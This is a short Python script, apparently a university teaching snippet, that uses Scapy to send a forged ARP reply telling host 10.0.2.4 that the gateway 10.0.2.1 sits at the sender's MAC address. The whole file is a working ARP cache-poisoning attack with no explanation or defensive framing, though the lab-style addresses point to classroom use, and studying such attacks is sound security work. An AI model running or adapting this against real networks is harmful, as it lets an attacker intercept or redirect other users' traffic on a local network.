# All-by-Pythonself
# Snippet for ARP cachie poisoning
# by Hae Young Lee
# at Cheongju University

from scapy . all import *

p = Ether (dst = "08:00:27:95:1f:5a", src = "08:00:27:ad:c2:d3") / ARP (op = 2, hwsrc = "08:00:27:ad:c2:d3", psrc = "10.0.2.1", hwdst = "08:00:27:95:1f:5a", pdst = "10.0.2.4")
sendp (p)
